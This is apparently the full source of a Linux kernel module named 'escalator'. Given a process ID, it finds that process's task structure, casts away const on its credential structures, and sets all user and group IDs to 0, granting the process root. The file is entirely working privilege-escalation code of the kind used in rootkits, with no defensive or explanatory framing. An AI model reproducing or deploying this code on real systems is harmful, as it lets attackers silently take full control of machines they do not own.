#include "escalate.h"

static void escalate(int pid) {

    printk(KERN_INFO "escalator: Escalation triggered\n");

    if (pid <= 1) {
        printk(KERN_ALERT "escalator: pid %d invalid for escalation\n", pid);

        return;
    }

    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task == NULL) {
        printk(KERN_ALERT "escalator: unable to retrieve task_struct\n");

        return;
    }

    // Cast away const. We can do this because we are the kernel and we need to, to change the contents
    credentials = (struct cred*) task->cred;
    if (credentials == NULL) {
        printk(KERN_ALERT "escalator: unable to retrieve cred\n");

        return;
    }

    // Cast away const. Same as above
    real_credentials = (struct cred*) task->real_cred;
    if (real_credentials == NULL) {
        printk(KERN_ALERT "escalator: unable to retrieve cred\n");

        return;
    }

    printk(KERN_INFO "escalator: PID: %d, cred: 0x%px, real_cred: 0x%px\n", task->pid, credentials, real_credentials);
    printk(KERN_INFO "escalator: UID: %d\n", credentials->uid.val);
    printk(KERN_INFO "escalator: GID: %d\n", credentials->gid.val);

    if (real_credentials == credentials) {
        printk(KERN_INFO "escalator: cred == real_cred, patching once\n");

        patch_credentials(credentials);
    } else {
        printk(KERN_INFO "escalator: cred != real_cred, patching both\n");

        patch_credentials(credentials);
        patch_credentials(real_credentials);
    }

    printk(KERN_INFO "escalator: escalated %d to root\n", task->pid);
}

static void patch_credentials(struct cred* credentials) {
    if (credentials == NULL) {
        printk(KERN_ALERT "escalator: patch_credentials: Passed credentials invalid\n");

        return;
    }

    credentials->uid.val = 0;
    credentials->suid.val = 0;
    credentials->euid.val = 0;
    credentials->fsuid.val = 0;

    credentials->gid.val = 0;
    credentials->sgid.val = 0;
    credentials->egid.val = 0;
    credentials->fsgid.val = 0;
}
